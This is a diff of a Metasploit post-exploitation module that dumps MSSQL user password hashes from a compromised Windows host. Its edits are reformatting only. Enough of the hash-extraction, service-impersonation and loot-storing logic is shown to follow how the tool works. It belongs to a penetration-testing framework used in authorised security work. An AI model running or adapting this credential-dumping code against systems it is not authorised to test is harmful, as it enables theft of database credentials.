@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -8,35 +9,34 @@ require 'rex'
 require 'msf/core/auxiliary/report'
 require 'msf/core/post/windows/mssql'
 
-
 class MetasploitModule < Msf::Post
   include Msf::Auxiliary::Report
   include Msf::Post::Windows::MSSQL
 
-  def initialize(info={})
-    super( update_info( info,
-        'Name'          => 'Windows Gather Local SQL Server Hash Dump',
-        'Description'   => %q{ This module extracts the usernames and password
-        hashes from an MSSQL server and stores them as loot. It uses the
-        same technique in mssql_local_auth_bypass.
-        },
-        'License'       => MSF_LICENSE,
-        'Author'        => [
-            'Mike Manzotti <mike.manzotti[at]dionach.com>',
-            'nullbind' # Original technique
-          ],
-        'Platform'      => [ 'win' ],
-        'SessionTypes'  => [ 'meterpreter' ],
-        'References'  =>
-          [
-            ['URL', 'https://www.dionach.com/blog/easily-grabbing-microsoft-sql-server-password-hashes']
-          ]
-      ))
+  def initialize(info = {})
+    super(update_info(info,
+                      'Name'          => 'Windows Gather Local SQL Server Hash Dump',
+                      'Description'   => %q( This module extracts the usernames and password
+                      hashes from an MSSQL server and stores them as loot. It uses the
+                      same technique in mssql_local_auth_bypass.
+                      ),
+                      'License'       => MSF_LICENSE,
+                      'Author'        => [
+                        'Mike Manzotti <mike.manzotti[at]dionach.com>',
+                        'nullbind' # Original technique
+                      ],
+                      'Platform'      => [ 'win' ],
+                      'SessionTypes'  => [ 'meterpreter' ],
+                      'References' =>
+                        [
+                          ['URL', 'https://www.dionach.com/blog/easily-grabbing-microsoft-sql-server-password-hashes']
+                        ]))
 
     register_options(
       [
-        OptString.new('INSTANCE',  [false, 'Name of target SQL Server instance', nil])
-      ], self.class)
+        OptString.new('INSTANCE', [false, 'Name of target SQL Server instance', nil])
+      ], self.class
+    )
   end
 
   def run
@@ -59,15 +59,13 @@ class MetasploitModule < Msf::Post
       fail_with(Failure::Unknown, 'Unable to identify MSSQL Service') unless service
 
       print_status("Identified service '#{service[:display]}', PID: #{service[:pid]}")
-      instance_name = service[:display].gsub('SQL Server (','').gsub(')','').lstrip.rstrip
+      instance_name = service[:display].gsub('SQL Server (', '').delete(')').strip
 
       begin
         get_sql_hash(instance_name)
       rescue RuntimeError
         # Attempt to impersonate sql server service account (for sql server 2012)
-        if impersonate_sql_user(service)
-          get_sql_hash(instance_name)
-        end
+        get_sql_hash(instance_name) if impersonate_sql_user(service)
       end
     ensure
       # return to original priv context
@@ -117,9 +115,9 @@ class MetasploitModule < Msf::Post
     if res.include?('0x')
       # Parse Data
       if hash_type == "mssql12"
-        res = res.unpack('H*')[0].gsub("200d0a", "_CRLF_").gsub("0d0a", "").gsub("_CRLF_", "0d0a").gsub(/../) {
-          |pair| pair.hex.chr
-        }
+        res = res.unpack('H*')[0].gsub("200d0a", "_CRLF_").gsub("0d0a", "").gsub("_CRLF_", "0d0a").gsub(/../) do |pair|
+          pair.hex.chr
+        end
       end
       hash_array = res.split("\r\n").grep(/0x/)
 
@@ -175,14 +173,13 @@ class MetasploitModule < Msf::Post
       loot_hashes << "#{user}:#{hash}\n"
     end
 
-    unless loot_hashes.empty?
-        # Store MSSQL password hash as loot
-        loot_path = store_loot('mssql.hash', 'text/plain', session, loot_hashes, 'mssql_hashdump.txt', 'MSSQL Password Hash')
-        print_good("MSSQL password hash saved in: #{loot_path}")
-        return true
+    if loot_hashes.empty?
+      return false
     else
-        return false
+      # Store MSSQL password hash as loot
+      loot_path = store_loot('mssql.hash', 'text/plain', session, loot_hashes, 'mssql_hashdump.txt', 'MSSQL Password Hash')
+      print_good("MSSQL password hash saved in: #{loot_path}")
+      return true
     end
   end
-
 end
